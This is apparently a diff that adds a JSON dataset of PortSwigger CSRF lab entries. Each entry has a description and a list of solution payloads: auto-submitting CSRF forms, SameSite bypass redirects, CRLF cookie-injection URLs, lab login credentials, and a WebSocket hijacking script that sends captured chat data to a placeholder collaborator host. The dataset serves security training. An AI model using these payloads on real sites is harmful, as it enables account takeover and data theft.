@@ -1,0 +1,182 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken",
+    "category": "csrf",
+    "title": "CSRF with broken Referer validation",
+    "description": "This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net",
+      "history.pushState()",
+      "history.pushState(\"\", \"\", \"/?YOUR-LAB-ID.web-security-academy.net\")",
+      "Referrer-Policy: unsafe-url"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present",
+    "category": "csrf",
+    "title": "CSRF where Referer validation depends on header being present",
+    "description": "This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "<meta name=\"referrer\" content=\"no-referrer\">"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override",
+    "category": "csrf",
+    "title": "SameSite Lax bypass via method override",
+    "description": "This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "POST /my-account/change-email",
+      "POST /login",
+      "POST",
+      "_method",
+      "GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1",
+      "<script>\n    document.location = \"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST\";\n</script>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect",
+    "category": "csrf",
+    "title": "SameSite Strict bypass via client-side redirect",
+    "description": "This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "POST /my-account/change-email",
+      "POST /login",
+      "SameSite=Strict",
+      "/post/comment/confirmation?postId=x",
+      "/resources/js/commentConfirmationRedirect.js",
+      "postId",
+      "GET /post/comment/confirmation?postId=x",
+      "/post/comment/confirmation?postId=foo",
+      "/post/foo",
+      "/post/comment/confirmation?postId=1/../../my-account",
+      "<script>\n    document.location = \"https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account\";\n</script>",
+      "<script>\n    document.location = \"https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1\";\n</script>",
+      "submit"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh",
+    "category": "csrf",
+    "title": "SameSite Lax bypass via cookie refresh",
+    "description": "This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.\nBrowsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows:\n<script>\n    window.onclick = () => {\n        window.open('about:blank')\n    }\n</script>",
+    "payloads": [
+      "wiener:peter",
+      "<script>\n    window.onclick = () => {\n        window.open('about:blank')\n    }\n</script>",
+      "POST /my-account/change-email",
+      "GET /oauth-callback?code=[...]",
+      "<script>\n    history.pushState('', '', '/')\n</script>\n<form action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\" method=\"POST\">\n    <input type=\"hidden\" name=\"email\" value=\"foo@bar.com\" />\n    <input type=\"submit\" value=\"Submit request\" />\n</form>\n<script>\n    document.forms[0].submit();\n</script>",
+      "POST",
+      "/social-login",
+      "<form method=\"POST\" action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\">\n    <input type=\"hidden\" name=\"email\" value=\"pwned@web-security-academy.net\">\n</form>\n<script>\n    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');\n    setTimeout(changeEmail, 5000);\n\n    function changeEmail(){\n        document.forms[0].submit();\n    }\n</script>",
+      "<form method=\"POST\" action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\">\n    <input type=\"hidden\" name=\"email\" value=\"pwned@portswigger.net\">\n</form>\n<p>Click anywhere on the page</p>\n<script>\n    window.onclick = () => {\n        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');\n        setTimeout(changeEmail, 5000);\n    }\n\n    function changeEmail() {\n        document.forms[0].submit();\n    }\n</script>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain",
+    "category": "csrf",
+    "title": "SameSite Strict bypass via sibling domain",
+    "description": "This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.",
+    "solution": "Make sure you fully audit all of the available attack surface. Keep an eye out for additional vulnerabilities that may help you to deliver your attack, and bear in mind that two domains can be located within the same site.",
+    "payloads": [
+      "GET /chat",
+      "READY",
+      "<script>\n    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');\n    ws.onopen = function() {\n        ws.send(\"READY\");\n    };\n    ws.onmessage = function(event) {\n        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});\n    };\n</script>",
+      "SameSite=Strict",
+      "Access-Control-Allow-Origin",
+      "cms-YOUR-LAB-ID.web-security-academy.net",
+      "Invalid username",
+      "username",
+      "<script>alert(1)</script>",
+      "alert(1)",
+      "POST /login",
+      "<script>\n    document.location = \"https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything\";\n</script>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie",
+    "category": "csrf",
+    "title": "CSRF where token is duplicated in cookie",
+    "description": "This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure \"double submit\" CSRF prevention technique.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "csrf",
+      "/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None",
+      "<script>",
+      "<img src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None\" onerror=\"document.forms[0].submit();\"/>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session",
+    "category": "csrf",
+    "title": "CSRF where token is not tied to user session",
+    "description": "This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "carlos:montoya"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie",
+    "category": "csrf",
+    "title": "CSRF where token is tied to non-session cookie",
+    "description": "This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "carlos:montoya",
+      "session",
+      "csrfKey",
+      "csrf",
+      "/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None",
+      "<script>",
+      "<img src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None\" onerror=\"document.forms[0].submit()\">"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method",
+    "category": "csrf",
+    "title": "CSRF where token validation depends on request method",
+    "description": "This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "csrf",
+      "<form action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\">\n    <input type=\"hidden\" name=\"email\" value=\"anything%40web-security-academy.net\">\n</form>\n<script>\n        document.forms[0].submit();\n</script>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present",
+    "category": "csrf",
+    "title": "CSRF where token validation depends on token being present",
+    "description": "This lab's email change functionality is vulnerable to CSRF.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "csrf",
+      "<form method=\"POST\" action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\">\n    <input type=\"hidden\" name=\"$param1name\" value=\"$param1value\">\n</form>\n<script>\n    document.forms[0].submit();\n</script>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/csrf/lab-no-defenses",
+    "category": "csrf",
+    "title": "CSRF vulnerability with no defenses",
+    "description": "This lab's email change functionality is vulnerable to CSRF.",
+    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.",
+    "payloads": [
+      "wiener:peter",
+      "<form method=\"POST\" action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\">\n    <input type=\"hidden\" name=\"email\" value=\"anything%40web-security-academy.net\">\n</form>\n<script>\n        document.forms[0].submit();\n</script>"
+    ]
+  }
+]
